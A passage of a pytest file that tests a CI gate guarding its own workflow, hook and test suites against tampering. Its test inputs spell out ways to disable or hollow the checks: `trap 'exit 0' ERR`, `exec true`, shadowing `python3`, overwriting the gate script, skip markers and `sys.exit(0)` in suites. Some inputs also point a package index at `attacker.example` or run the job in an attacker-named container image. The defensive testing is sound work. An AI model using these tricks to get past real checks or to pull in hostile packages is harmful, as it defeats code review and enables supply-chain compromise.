    for shape, r in each_pr(repo, lambda shape: pr_case("chore/gate-workflow", {wf: gate_workflow(a=shape)}, **cap), ("! " + VERDICT_CMD + "; true", "if " + VERDICT_CMD + "; then :; fi", "if ! " + VERDICT_CMD + "; then exit 1; fi",
                  "while " + VERDICT_CMD + "; do break; done")):
        assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
    # an `if:` on the step's dash line skips the step like one under a `name:`
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("      - env:\n", "      - if: false\n        env:\n", 1)}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    # the head fetch is a contract command, before the verdict
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("      - run: git fetch --no-tags origin \"$HEAD_SHA\"\n", "")}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout and "git fetch" in r.stdout, r.stdout
    # the handoff: upload after the export, download of the same name into scripts/gate before the suite
    for broken, r in each_pr(repo, lambda broken: pr_case("chore/gate-workflow", {wf: broken}, **cap), (typed.replace("      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n", ""),
                   typed.replace("      - uses: actions/download-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: scripts/gate\n", ""),
                   typed.replace("          name: proposed-spec-gate\n          path: scripts/gate\n", "          name: other\n          path: scripts/gate\n"),
                   typed.replace("          name: proposed-spec-gate\n          path: scripts/gate\n", "          name: proposed-spec-gate\n          path: elsewhere\n"),
                   typed.replace("      - uses: actions/upload-artifact@v4\n", "      - if: false\n        uses: actions/upload-artifact@v4\n"),
                   typed.replace("      - env:\n", "      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n      - env:\n", 1)
                        .replace("      - run: " + EXPORT_CMD + "\n      - uses: actions/upload-artifact@v4\n        with:\n          name: proposed-spec-gate\n          path: ${{ runner.temp }}/proposed/\n",
                                 "      - run: " + EXPORT_CMD + "\n"))):
        assert r.returncode == 1 and ("no longer reaches the suite's job" in r.stdout or "uploaded or downloaded more than once" in r.stdout), (broken, r.stdout)
    # where the exporter exists, its proposed copy is exported and the base's exporter suite runs, isolated
    exporter = {"scripts/gate/export_model_registry.py": "print('x')\n"}
    r = pr(repo, "chore/gate-workflow", {wf: typed, **exporter}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout and "export_model_registry" in r.stdout, r.stdout
    export_both = EXPORT_CMD + "\n          git show \"$HEAD_SHA:scripts/gate/export_model_registry.py\" > \"$RUNNER_TEMP/proposed/export_model_registry.py\""
    both_suites = SUITE_CMD + "\n          python3 -m pytest tests/scripts/test_export_model_registry.py -q"
    with_exporter = gate_workflow(b="|\n          " + export_both, c="|\n          " + both_suites)
    assert pr(repo, "chore/gate-workflow", {wf: with_exporter, **exporter}, **cap).returncode == 0
    misplaced = gate_workflow(b="|\n          " + export_both + "\n          python3 -m pytest tests/scripts/test_export_model_registry.py -q")
    r = pr(repo, "chore/gate-workflow", {wf: misplaced, **exporter}, **cap)
    assert r.returncode == 1 and ("does not follow" in r.stdout or "holds no checkout credentials" in r.stdout), r.stdout
    # the hook's mode is read from the head tree
    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"})
    _git(repo, "checkout", "-q", "-B", "chore/gate-hook", "base")
    (repo / ".githooks/pre-commit").chmod(0o644)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "mode")
    r = gate(repo, "--pr", _git(repo, "rev-parse", "base"), _git(repo, "rev-parse", "HEAD"), PR_HEAD_REF="chore/gate-hook", **cap)
    assert r.returncode == 1 and "has mode 100644 in this change; the hook stays executable" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\n# executable again\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap).returncode == 0


def test_requirement_definitions_are_rendered_text_and_a_new_registry_covers_head_specs(repo):
    """solyra#72 r4121100680, r4121100668 (spec_gate.py:66, :1513).

    `` `**REQ-MODEL-001:**` `` in prose counted as a definition, so the real one could be
    pruned; a new registry was checked against the base's specs alone, so a spec landing
    with it could cite an ID it omits and refuse its own implementation later. Both refused.
    """
    example = REQUIREMENTS_TEXT.replace("**REQ-MODEL-001:** Every model states the decision it produces.",
                                        "Definitions look like `**REQ-MODEL-001:** text`.")
    r = pr(repo, "docs/reqs", {REQUIREMENTS: example})
    assert r.returncode == 1 and "no longer defines 1 ID(s) the base has (REQ-MODEL-001" in r.stdout, r.stdout
    fenced = REQUIREMENTS_TEXT + "\n```\n**REQ-FAKE-001:** in a fence\n```\n"
    assert pr(repo, "docs/reqs", {REQUIREMENTS: fenced}).returncode == 0
    on_base(repo, {REQUIREMENTS: None})
    new_spec = "docs/superpowers/specs/2026-09-28-data-e.md"
    r = pr(repo, "docs/reqs", {REQUIREMENTS: REQUIREMENTS_TEXT, new_spec: spec(feat_id="FEAT-DATA-001", req_ids=["REQ-DATA-009"])})
    assert r.returncode == 1 and "omits 1 requirement(s) the specs cite (REQ-DATA-009)" in r.stdout, r.stdout
    assert pr(repo, "docs/reqs", {REQUIREMENTS: REQUIREMENTS_TEXT, new_spec: spec(feat_id="FEAT-DATA-001", req_ids=["REQ-DATA-001"])}).returncode == 0
    # the generated registry rides a chore/ change only with the exporter that writes it
    generated = "docs/product/generated/model-registry.json"
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    r = pr(repo, "chore/exporter", {generated: "{}\n"}, **cap)
    assert r.returncode == 1 and "changes 1 gated file(s)" in r.stdout, r.stdout
    assert pr(repo, "chore/exporter", {generated: "{}\n", "scripts/gate/export_model_registry.py": "print('x')\n"}, **cap).returncode == 0


def test_quoted_text_is_text_across_lines(repo):
    """stocks#1205 r4121216898 (spec_gate.py:343): quote state was per line, so an `echo "x;`
    opened on one line and closed after the verdict command on the next made the command a
    statement of its own. A quoted span is text however many lines it spans."""
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    for decoy, r in each_pr(repo, lambda decoy: pr_case("chore/gate-workflow", {wf: gate_workflow(a=decoy)}, **cap), ('|\n          echo "disabled;\n          ' + VERDICT_CMD + '\n          "',
                  '|\n          echo "disabled; ' + VERDICT_CMD + '"',
                  "|\n          echo 'disabled;\n          " + VERDICT_CMD + "\n          '",
                  '|\n          x="\n          ' + VERDICT_CMD + '\n          "')):
        assert r.returncode == 1 and "no longer executes" in r.stdout, (decoy, r.stdout)
    quoted_args = gate_workflow(a='|\n          echo "note: $HEAD_SHA"\n          ' + VERDICT_CMD + '\n          echo "done"')
    assert pr(repo, "chore/gate-workflow", {wf: quoted_args}, **cap).returncode == 0


def test_startup_environment_substitutions_nested_runs_paths_and_checkouts_are_the_contract(repo):
    """solyra#72 r4121374618 (P1), r4121374631 (P1), r4121374639 (P1), r4121374653 (P1),
    r4121374648 (P1), r4121374610 (P1) (spec_gate.py:531, :369, :1147, :260, :1135, :451).

    `PYTEST_ADDOPTS: --collect-only` or `BASH_ENV` on a step kept the command text and ran
    nothing; `echo "$(cmd)"` counted cmd; `env: {run: cmd}` read as a step; an upload path
    merely containing `proposed` passed; a checkout under `if: false` or after the commands
    counted. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
    for env_block, r in each_pr(repo, lambda env_block: pr_case("chore/gate-workflow", {wf: env_block}, **cap), (typed.replace("      - env:\n", "      - env:\n          PYTEST_ADDOPTS: --collect-only\n", 1),
                      typed.replace("      - env:\n", "      - env:\n          BASH_ENV: scripts/gate/skip.sh\n", 1),
                      typed.replace("permissions:\n", "env:\n  PYTHONPATH: scripts/gate/shim\npermissions:\n", 1),
                      typed.replace("  gate:\n", "  gate:\n    env: { PATH: 'scripts/gate/bin:/usr/bin' }\n", 1),
                      typed.replace("      - run: git fetch", "      - run: echo \"scripts/gate/bin\" >> \"$GITHUB_PATH\"\n      - run: git fetch", 1))):
        assert r.returncode == 1 and ("in an `env:` block" in r.stdout or "assigns or unsets" in r.stdout), (env_block, r.stdout)
    for subst, r in each_pr(repo, lambda subst: pr_case("chore/gate-workflow", {wf: gate_workflow(a=subst)}, **cap), ('echo "$(' + VERDICT_CMD + ')"', 'printf "%s" "$(' + VERDICT_CMD + ')"', 'true $(' + VERDICT_CMD + ')')):
        assert r.returncode == 1 and "no longer executes" in r.stdout, (subst, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a='|\n          out=$(' + VERDICT_CMD + ' 2>&1) && rc=0 || rc=$?\n          printf "%s\\n" "$out"\n          exit "$rc"')}, **cap).returncode == 0
    nested = typed.replace("        run: " + VERDICT_CMD + "\n", "          run: " + VERDICT_CMD + "\n        run: 'true'\n")
    r = pr(repo, "chore/gate-workflow", {wf: nested}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    other_dir = typed.replace("          path: ${{ runner.temp }}/proposed/\n", "          path: ${{ runner.temp }}/not-proposed/\n")
    r = pr(repo, "chore/gate-workflow", {wf: other_dir}, **cap)
    assert r.returncode == 1 and "no longer reaches the suite's job" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-workflow", {wf: typed.replace("          path: ${{ runner.temp }}/proposed/\n", "          path: $RUNNER_TEMP/proposed\n")}, **cap).returncode == 0
    checkout = "      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n"
    for broken, r in each_pr(repo, lambda broken: pr_case("chore/gate-workflow", {wf: broken}, **cap), (typed.replace(checkout, "      - if: false\n        uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n", 1),
                   typed.replace(checkout + "      - run: git fetch --no-tags origin \"$HEAD_SHA\"\n",
                                 "      - run: git fetch --no-tags origin \"$HEAD_SHA\"\n" + checkout, 1))):
        assert r.returncode == 1 and "without an actions/checkout step that is unconditional and before them" in r.stdout, (broken, r.stdout)


def test_workflow_identity_shadowed_executables_stray_modules_and_parsed_permissions(repo):
    """stocks#1205 r4121413674 (P1), r4121413657 (P1), r4121413687 (P1), r4121413700 (P1)
    (spec_gate.py:97, :401, :1113; spec-gate.yml:66).

    A renamed workflow or job left branch protection waiting on a check that never reports;
    `python3() { echo ok; }` made every contract command a no-op; a `scripts/gate/subprocess.py`
    shadowed an import the base's suite never saw; `permissions:` matched as text inside a
    scalar. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("name: spec-gate\n", "name: gate-v2\n", 1)}, **cap)
    assert r.returncode == 1 and "no longer named `spec-gate`" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("name: spec-gate\n", "", 1)}, **cap)
    assert r.returncode == 1 and "no longer named `spec-gate`" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  gate:\n", "  verdict:\n", 1).replace("needs: gate", "needs: verdict")}, **cap)
    assert r.returncode == 1 and "keeps its job name" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  base-suite:\n", "  suite:\n", 1)}, **cap)
    assert r.returncode == 1 and "keeps its job name" in r.stdout, r.stdout
    for shadow, r in each_pr(repo, lambda shadow: pr_case("chore/gate-workflow", {wf: gate_workflow(a="|\n          " + shadow)}, **cap), ("python3() { echo \"spec gate ok\"; }\n          " + VERDICT_CMD, "function git { :; }\n          " + VERDICT_CMD,
                   "alias python3=true\n          " + VERDICT_CMD)):
        assert r.returncode == 1 and "as a shell function or alias" in r.stdout, (shadow, r.stdout)
    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"})
    r = pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3() { :; }\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap)
    assert r.returncode == 1 and "as a shell function or alias" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-shim", {"scripts/gate/helpers.py": "raise SystemExit(0)\n"}, **cap)
    assert r.returncode == 1 and "scripts/gate/ holds" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-exporter", {"scripts/gate/export_model_registry.py": "print('x')\n"}, **cap).returncode == 0   # the exporter is not stray
    scalar = typed.replace("permissions:\n  contents: read\n", "run-name: |\n  permissions:\n    contents: read\n", 1)
    r = pr(repo, "chore/gate-workflow", {wf: scalar}, **cap)
    assert r.returncode == 1 and "no top-level `permissions:` mapping" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-workflow", {wf: typed.replace("permissions:\n  contents: read\n", "permissions: { contents: read }\n", 1)}, **cap).returncode == 0
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("permissions:\n  contents: read\n", "permissions: read-all\n", 1)}, **cap)
    assert r.returncode == 1 and "no top-level `permissions:` mapping" in r.stdout, r.stdout


def test_traps_execs_secrets_repositories_quoted_keys_and_the_exporter_suite_are_the_contract(repo):
    """solyra#72 r4121572544 (P1), r4121572517 (P1); stocks#1205 r4121602767 (P1), r4121602804 (P1),
    r4121602788 (P1), r4121602817 (P1), r4121602841 (spec_gate.py:350, :1171, :427, :626, :188,
    :1216, :1249).

    `trap 'exit 0' ERR` and `exec true` made the commands below them no-ops; a secret on the
    suite job would reach a fork's Python; a checkout of another `repository:` or of a ref
    merely mentioning the head ran another tree; `"PYTEST_ADDOPTS":` escaped the key check;
    the exporter suite could be hollowed; `tests/scripts/test_spec_gate.py --commit` passed
    as the hook's gate call. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    for shape, r in each_pr(repo, lambda shape: pr_case("chore/gate-workflow", {wf: gate_workflow(a=shape)}, **cap), ("|\n          trap 'exit 0' ERR\n          " + VERDICT_CMD, "|\n          exec true\n          " + VERDICT_CMD,
                  "|\n          exec echo done\n          " + VERDICT_CMD)):
        assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="|\n          exec 2>&1\n          " + VERDICT_CMD)}, **cap).returncode == 0
    assert pr(repo, "chore/gate-workflow", {wf: gate_workflow(a="exec " + VERDICT_CMD)}, **cap).returncode == 0
    for secret, r in each_pr(repo, lambda secret: pr_case("chore/gate-workflow", {wf: secret}, **cap), (typed.replace("  base-suite:\n", "  base-suite:\n    env:\n      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}\n", 1),
                   typed.replace("      - env:\n", "      - env:\n          TOKEN: ${{ github.token }}\n", 1))):
        assert r.returncode == 1 and "reads a secret or the token" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("      - env:\n", "      - env:\n          \"PYTEST_ADDOPTS\": --collect-only\n", 1)}, **cap)
    assert r.returncode == 1 and ("in an `env:` block" in r.stdout or "quotes a mapping key" in r.stdout), r.stdout
    rc = ".github/workflows/registry-check.yml"
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n{WITH}      - run: |\n{BODY}")
    cmds = ('python3 -m py_compile "$gate"', 'python3 "$gate" --pr "$BASE_SHA" "$HEAD_SHA"', "python3 -m pytest tests/scripts/test_spec_gate.py")
    plain = "".join(f"          {c}\n" for c in cmds)
    assert pr(repo, "chore/gate-workflow", {rc: head.replace("{WITH}", "").replace("{BODY}", plain)}, **cap).returncode == 0
    assert pr(repo, "chore/gate-workflow", {rc: head.replace("{WITH}", "        with:\n          repository: ${{ github.repository }}\n          ref: ${{ github.event.pull_request.head.sha }}\n").replace("{BODY}", plain)}, **cap).returncode == 0
    for with_block, r in each_pr(repo, lambda with_block: pr_case("chore/gate-workflow", {rc: head.replace("{WITH}", with_block).replace("{BODY}", plain)}, **cap), ("        with:\n          repository: other/repo\n          ref: ${{ github.event.pull_request.head.sha }}\n",
                       "        with:\n          ref: ${{ github.event.pull_request.head.repo.default_branch }}\n")):
        assert r.returncode == 1 and "checks out" in r.stdout, (with_block, r.stdout)
    suite = "tests/scripts/test_export_model_registry.py"
    on_base(repo, {suite: "def test_a():\n    assert f(1)\n\ndef test_b():\n    assert f(2)\n"})
    r = pr(repo, "chore/gate-suite", {suite: "def test_a():\n    assert f(1)\n"}, **cap)
    assert r.returncode == 1 and "drops 1 test(s) the base has (test_b)" in r.stdout, r.stdout
    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"})
    r = pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 tests/scripts/test_spec_gate.py --commit\n"}, **cap)
    assert r.returncode == 1 and ("no longer runs `scripts/gate/spec_gate.py --commit`" in r.stdout or "is not one the hook may carry" in r.stdout), r.stdout
    assert pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 \"$(git rev-parse --show-toplevel)/scripts/gate/spec_gate.py\" --commit\n"}, **cap).returncode == 0
    r = pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\nset -e\ntrap 'exit 0' ERR\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap)
    assert r.returncode == 1 and ("no longer runs" in r.stdout or "is not one the hook may carry" in r.stdout), r.stdout


def test_trigger_filters_yaml_validity_catalog_columns_and_quoted_permissions(repo):
    """solyra#72 r4121753959 (P1), r4121753972 (P1), r4121753989 (P1), r4121753981, r4121753996
    (spec_gate.py:1268, :1209, :697, :1775; plan-template.md:28).

    A `paths:` filter under the trigger stopped the workflow from starting; a head that is not
    YAML passed the line scan and would have unloaded the gate on main; `"permissions": write-all`
    escaped the write-grant check; a catalog without a Status column failed every later
    close-out; the plan template's close task had no Spec line. Each is refused or corrected.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    for filt in ("    paths: [never/**]\n", "    paths-ignore:\n      - '**'\n", "    branches: [nothing]\n"):
        r = pr(repo, "chore/gate-workflow", {wf: typed.replace("    types: [opened, synchronize, reopened, edited, ready_for_review]\n",
                                                             "    types: [opened, synchronize, reopened, edited, ready_for_review]\n" + filt, 1)}, **cap)
        assert r.returncode == 1 and "filter; the gate's workflows run for every pull request" in r.stdout, (filt, r.stdout)
    r = pr(repo, "chore/gate-workflow", {wf: typed + "broken: [\n"}, **cap)
    assert r.returncode == 1 and "is not valid YAML" in r.stdout, r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  base-suite:\n", "  base-suite:\n    \"permissions\": write-all\n", 1)}, **cap)
    assert r.returncode == 1 and ("grants a write permission" in r.stdout or "duplicate key" in r.stdout or "quotes a mapping key" in r.stdout), r.stdout
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  base-suite:\n    needs: gate\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n",
                                                         "  base-suite:\n    needs: gate\n    runs-on: ubuntu-latest\n    permissions:\n      'contents': write\n", 1)}, **cap)
    assert r.returncode == 1 and ("grants a write permission" in r.stdout or "quotes a mapping key" in r.stdout), r.stdout
    r = pr(repo, "docs/catalog", {CATALOG: CATALOG_TEXT.replace("| Status |", "| State |", 1)})
    assert r.returncode == 1 and "no longer carries the Status field(s) the close-out reads" in r.stdout, r.stdout
    assert pr(repo, "docs/catalog", {CATALOG: CATALOG_TEXT + "\nA note.\n"}).returncode == 0
    template = (REPO / ".claude/skills/product-delivery/references/plan-template.md").read_text(encoding="utf-8")
    close = template[template.index("## Task N: close"):].split("```")[0]
    data_spec, new_plan = "docs/superpowers/specs/2026-09-28-data-t.md", "docs/superpowers/plans/2026-09-28-data-t.md"
    on_base(repo, {data_spec: spec(feat_id="FEAT-DATA-001")})
    from_template = plan(feat_id="FEAT-DATA-001", spec=data_spec, branch="fix/feat-data-001-t").replace(TASKS, "\n" + close)
    r = pr(repo, "docs/plan-t", {new_plan: from_template})
    assert r.returncode == 0, r.stdout   # the template's close task cites its spec section


def test_gate_files_stay_read_only_runners_suites_and_supersedes_are_the_contract(repo):
    """stocks#1205 r4121777299 (P1), r4121777320 (P1), r4121777310 (P1), r4121777354
    (spec_gate.py:1216, :329, :1310, :909).

    A step could overwrite scripts/gate/spec_gate.py before the verdict, or run inline code
    that would; `runs-on: windows-latest` made every run block PowerShell; `pytestmark =
    pytest.mark.skip` kept every name and assertion while running nothing; `supersedes` could
    name a spec that does not exist. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
    for pre, r in each_pr(repo, lambda pre: pr_case("chore/gate-workflow", {wf: gate_workflow(a="|\n          " + pre + "\n          " + VERDICT_CMD)}, **cap), ("printf 'print(\"spec gate ok\")' > scripts/gate/spec_gate.py", "cp /tmp/x scripts/gate/spec_gate.py",
                "sed -i 's/x/y/' tests/scripts/test_spec_gate.py", "git checkout origin/x -- scripts/gate", "python3 -c 'open(\"scripts/gate/spec_gate.py\",\"w\")'")):
        assert r.returncode == 1 and ("writes to or replaces a gate file" in r.stdout or "runs inline code" in r.stdout), (pre, r.stdout)
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("      - run: git fetch", "      - uses: some/action@v1\n      - run: git fetch", 1)}, **cap)
    assert r.returncode == 1 and ("runs before the verdict" in r.stdout or "use only actions/checkout" in r.stdout), r.stdout
    for runner, r in each_pr(repo, lambda runner: pr_case("chore/gate-workflow", {wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", f"  gate:\n    runs-on: {runner}\n", 1)}, **cap), ("windows-latest", "macos-latest")):
        assert r.returncode == 1 and "run on ubuntu-*" in r.stdout, (runner, r.stdout)
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n", 1)}, **cap)
    assert r.returncode == 1 and "no declared runner" in r.stdout, r.stdout
    suite_text = "def test_a():\n    assert f(1)\n"
    on_base(repo, {"tests/scripts/test_spec_gate.py": suite_text})
    for escape, r in each_pr(repo, lambda escape: pr_case("chore/gate-suite", {"tests/scripts/test_spec_gate.py": suite_text + "\n" + escape}, **cap), ("import pytest\npytestmark = pytest.mark.skip(reason='x')\n", "import pytest\n@pytest.mark.skipif(True, reason='x')\ndef test_z():\n    assert f(1)\n",
                   "def pytest_collection_modifyitems(items):\n    items.clear()\n", "import sys\nsys.exit(0)\n")):
        assert r.returncode == 1 and "no skip markers, collection hooks or exits" in r.stdout, (escape, r.stdout)
    r = pr(repo, "docs/spec-two", {"docs/superpowers/specs/2026-09-28-model-two.md": spec(supersedes="docs/superpowers/specs/does-not-exist.md")})
    assert r.returncode == 1 and "is not a spec on the base" in r.stdout, r.stdout
    on_base(repo, {"docs/superpowers/specs/2026-09-28-data-s.md": spec(feat_id="FEAT-DATA-001")})
    r = pr(repo, "docs/spec-two", {"docs/superpowers/specs/2026-09-28-model-two.md": spec(supersedes="docs/superpowers/specs/2026-09-28-data-s.md")})
    assert r.returncode == 1 and "a spec for FEAT-DATA-001, not FEAT-MODEL-001" in r.stdout, r.stdout
    assert pr(repo, "docs/spec-two", {"docs/superpowers/specs/2026-09-28-model-two.md": spec(supersedes=SPEC)}).returncode == 0


def test_workflows_are_plain_block_yaml_without_duplicate_keys(repo):
    """stocks#1205 r4121888791 (P1), r4121888805 (P1), r4121888782 (P1) (spec_gate.py:674, :274, :620).

    `"repository":`, `"if": false` and other quoted keys escaped every bare-key regex; a second
    top-level `jobs:` was kept by PyYAML and ignored by the line scan. The gate now refuses
    quoted keys, anchors, aliases, merge keys, tags, tabs and duplicate keys outright, so what
    GitHub reads is what the line scan reads.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    for bad, why in ((typed.replace("      - env:\n", "      - \"if\": false\n        env:\n", 1), "quotes a mapping key"),
                     (typed.replace("        with:\n          ref: ${{ github.event.pull_request.base.sha }}\n",
                                    "        with:\n          'repository': attacker/static\n          ref: ${{ github.event.pull_request.base.sha }}\n", 1), "quotes a mapping key"),
                     (typed + "jobs: {}\n", "duplicate key"),
                     (typed.replace("permissions:\n  contents: read\n", "permissions: &p\n  contents: read\n", 1), "anchor, alias, merge key or tag"),
                     (typed.replace("  gate:\n", "  gate:\n\truns-on: ubuntu-latest\n", 1), "is not valid YAML")):
        r = pr(repo, "chore/gate-workflow", {wf: bad}, **cap)
        assert r.returncode == 1 and why in r.stdout, (bad[:80], r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0


def test_sentinels_and_grouped_set_or_trap_do_not_hide_a_failure(repo):
    """Red-team of this PR (spec_gate.py:335, :382, :396): a literal `__STEP__` line reset the
    model's errexit, and `{ set +e; }` or `{ trap 'exit 0' ERR; }` escaped the depth-0 checks
    while acting on the current shell. Each is refused, in the workflows and the hook.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    for shape, r in each_pr(repo, lambda shape: pr_case("chore/gate-workflow", {wf: gate_workflow(a=shape)}, **cap), ("|\n          set +e\n          __STEP__\n          " + VERDICT_CMD + "\n          true",
                  "|\n          __SUB__\n          " + VERDICT_CMD,
                  "|\n          { set +e; }\n          " + VERDICT_CMD + "\n          true",
                  "|\n          if true; then set +e; fi\n          " + VERDICT_CMD + "\n          true",
                  "|\n          { trap 'exit 0' ERR; }\n          " + VERDICT_CMD,
                  "|\n          true && set +e\n          " + VERDICT_CMD + "\n          true",
                  "|\n          if true; then set -e; fi\n          set +e\n          " + VERDICT_CMD + "\n          true")):
        assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"})
    r = pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/usr/bin/env bash\nset -e\n{ trap 'exit 0' ERR; }\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap)
    assert r.returncode == 1 and ("no longer runs" in r.stdout or "is not one the hook may carry" in r.stdout), r.stdout


def test_contract_jobs_keep_their_context_and_runner(repo):
    """Red-team of this PR (spec_gate.py:548, :1385, :177): a job `name:` or a `strategy.matrix`
    renamed the check context so the required `spec-gate / gate` was never produced, `container:`
    ran the verdict inside an image the PR named, and `PIP_INDEX_URL` was outside the protected
    names although the verdict step installs PyYAML first. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/spec-gate.yml"
    typed = gate_workflow()
    for extra, r in each_pr(repo, lambda extra: pr_case("chore/gate-workflow", {wf: typed.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n" + extra, 1)}, **cap), ("    name: gate-x\n", "    strategy:\n      matrix:\n        shard: [1, 2]\n", "    container: ghcr.io/attacker/img:latest\n",
                  "    services:\n      db:\n        image: postgres\n", "    environment: production\n")):
        assert r.returncode == 1 and "keeps its key as its check context" in r.stdout, (extra, r.stdout)
    r = pr(repo, "chore/gate-workflow", {wf: typed.replace("  base-suite:\n", "  base-suite:\n    name: bs-x\n", 1)}, **cap)
    assert r.returncode == 1 and "keeps its key as its check context" in r.stdout, r.stdout
    for env_name, r in each_pr(repo, lambda env_name: pr_case("chore/gate-workflow", {wf: typed.replace("permissions:\n", f"env:\n  {env_name}: https://attacker.example/simple/\npermissions:\n", 1)}, **cap), ("PIP_INDEX_URL", "PIP_EXTRA_INDEX_URL", "NODE_OPTIONS", "UV_INDEX_URL", "HTTPS_PROXY", "https_proxy",
                     "SSL_CERT_FILE", "REQUESTS_CA_BUNDLE", "RUNNER_TEMP", "GITHUB_ENV", "TMPDIR", "NODE_PATH")):
        assert r.returncode == 1 and "in an `env:` block" in r.stdout, (env_name, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: typed}, **cap).returncode == 0
    # red-team round three: a blank or whitespace-only line after `jobs:` emptied the job list, so `container:`,
    # the runner and every other job-level check were skipped; YAML reads the file exactly as without it
    for gap in ("\n", "   \n"):
        spaced = typed.replace("jobs:\n", "jobs:\n" + gap, 1)
        assert pr(repo, "chore/gate-workflow", {wf: spaced}, **cap).returncode == 0, "a blank line under jobs: is the same file"
        r = pr(repo, "chore/gate-workflow", {wf: spaced.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: ubuntu-latest\n    container: ghcr.io/attacker/img:latest\n", 1)}, **cap)
        assert r.returncode == 1 and "declares `container`" in r.stdout, r.stdout
        r = pr(repo, "chore/gate-workflow", {wf: spaced.replace("  gate:\n    runs-on: ubuntu-latest\n", "  gate:\n    runs-on: self-hosted\n", 1)}, **cap)
        assert r.returncode == 1 and "runs on self-hosted" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-workflow", {wf: typed.replace("on:\n  pull_request_target:\n", "on:\n\n  pull_request_target:\n", 1)}, **cap).returncode == 0
